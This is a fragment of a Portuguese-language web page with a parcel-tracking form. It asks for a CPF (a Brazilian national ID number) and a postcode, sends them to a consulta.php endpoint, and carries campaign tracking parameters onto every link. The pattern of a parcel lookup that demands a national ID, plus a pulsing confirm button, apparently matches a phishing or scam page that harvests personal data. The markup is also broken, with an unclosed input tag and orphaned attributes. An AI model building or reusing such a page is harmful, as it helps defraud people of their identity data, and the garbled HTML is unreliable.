  <style>
    /* Animação para o botão pulsando */
    @keyframes pulsar {
      0% {
        transform: scale(1);
      }

      50% {
        transform: scale(1.1);
      }

      100% {
        transform: scale(1);
      }
    }

    #confirmar-btn {
      animation: pulsar 1s infinite;
    }

    /* Estilos para o pop-up */
    #popup-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      animation: fadeInOverlay 0.5s ease-out;
    }

    #popup-content {
      background: #fff;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
      text-align: center;
      width: 90%;
      max-width: 500px;
      animation: slideIn 0.5s ease-out;
      font-family: 'Arial', sans-serif;
    }

    #popup-content h2 {
      font-size: 1.8rem;
      font-weight: bold;
      margin-bottom: 20px;
      color: #003157;
    }

    #popup-content p {
      font-size: 1.1rem;
      margin-bottom: 15px;
    }

    #popup-content p span {
      font-weight: bold;
      color: #007bff;
    }

    #popup-content .btn {
      margin-top: 20px;
      font-size: 1rem;
      padding: 10px 20px;
      border-radius: 8px;
    }

    /* Animações */
    @keyframes fadeInOverlay {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    @keyframes slideIn {
      from {
        transform: translateY(-50px);
        opacity: 0;
      }

      to {
        transform: translateY(0);
        opacity: 1;
      }
    }

    /* Animação de carregamento */
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid rgba(0, 0, 0, 0.1);
      border-top-color: #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }
  </style>

      <form id="form-rastreamento">
        <span>Deseja acompanhar seu objeto?</span><br>

        <div class="form-group mt-1">
          <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required

        </div>

        </div>

            style="border: 4px solid rgba(0,0,0,0.1); border-left-color: #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto;">

  <script>
    document.getElementById('form-rastreamento').addEventListener('submit', async function (event) {
      event.preventDefault();

      const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
      const cepInput = document.getElementById('cep');
      const cep = cepInput.disabled ? '' : cepInput.value.replace(/\D/g, '');

      const botao = document.getElementById('consultar-btn');
      const botaoContainer = document.getElementById('botao-container');
      const loadingContainer = document.getElementById('loading-container');

      if (!cpf) {
        alert('Por favor, insira o CPF.');
        return;
      }

      
      botao.style.display = "none";

      
      setTimeout(() => {
        botaoContainer.style.display = "none";
        loadingContainer.style.display = "block";
      }, 100);

      try {
        const response = await fetch(`consulta.php?cpf=${cpf}&cep=${cep}`);
        const data = await response.json();

        if (data.status === 200) {
          var currentUrlParams = window.location.search;
          window.location.href = "informacoes" + currentUrlParams;
          
        } else {
          alert('Erro na consulta: ' + (data.message || 'Tente novamente.'));
          botao.style.display = "block"; 
          botaoContainer.style.display = "flex";
          loadingContainer.style.display = "none";
        }
      } catch (error) {
        alert('Erro ao conectar ao servidor.');
        botao.style.display = "block"; 
        botaoContainer.style.display = "flex";
        loadingContainer.style.display = "none";
      }
    });

    document.getElementById('nao-sei-cep').addEventListener('change', function () {
      const cepInput = document.getElementById('cep');
      cepInput.disabled = this.checked;
      if (this.checked) {
        cepInput.value = '';
      }
    });
  </script>






  <script>
    //APELAUTM
    var timer = setInterval(function () {                                                //APELAUTM
      const location = new URL(document.location.href);                                //APELAUTM
      const fields = ["src", "sck", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
      var links = document.getElementsByTagName("a");                                  //APELAUTM
      //APELAUTM
      for (var i = 0, n = links.length; i < n; i++) {                                  //APELAUTM
        if (links[i].href.includes("#")) continue;                                   //APELAUTM
        if (links[i].href) {                                                         //APELAUTM
          let link = new URL(links[i].href);                                       //APELAUTM
          fields.forEach(field => {                                                //APELAUTM
            if (location.searchParams.get(field))                                //APELAUTM
              link.searchParams.set(field, location.searchParams.get(field));  //APELAUTM
          });
          let href = link.href;
          links[i].href = href;
        }
      }
    }, 500);
    //APELAUTM
  </script>
